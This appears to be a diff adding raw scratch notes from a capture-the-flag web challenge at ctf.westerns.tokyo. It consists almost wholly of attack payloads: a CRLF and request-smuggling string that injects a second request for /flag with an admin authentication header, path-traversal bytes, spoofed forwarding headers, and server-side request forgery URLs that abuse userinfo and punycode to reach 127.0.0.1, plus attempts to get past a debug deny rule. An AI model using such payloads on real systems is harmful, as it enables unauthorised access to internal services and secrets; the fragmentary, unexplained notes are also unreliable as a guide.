@@ -1,0 +1,25 @@
+test%C4%A0HTTP%2F1.1%C4%8D%C4%8AHOST%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Fflag%C4%A0HTTP%2F1.1%C4%8D%C4%8AHOST%3A%C4%A0127.0.0.1%C4%8D%C4%8Aadminauth%3A%C4%A0secretpassword%C4%8D%C4%8Apug%3A%C4%A0123%C4%8D%C4%8Atest%3A
+
+http://universe.chal.ctf.westerns.tokyo/a?q=\xff\x2E\xFF\x2E/
+
+
+'x-forwarded-host': '127.0.0.1',
+'x-forwarded-proto': 'http',
+'x-forwarded-port': '80',
+'x-forwarded-for': '::ffff:127.1.1.1',
+'if-none-match': 'W/"2d-vFaN1EKboWyO9TtxBJ8wlkc8nh4"',
+
+
+universe.chal.ctf.westerns.tokyo/api/true-answer/
+
+
+http://alerts.%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88@xn--4zhaaaaaaaa/foo
+
+http://alerts.██████████@http://127.0.0.1/api/true-answer/
+
+debug<- 127.0.0.1 deny
+
+
+['/debug']/answer
+
+['d']+['e']+['b']+['u']+['g'] = 
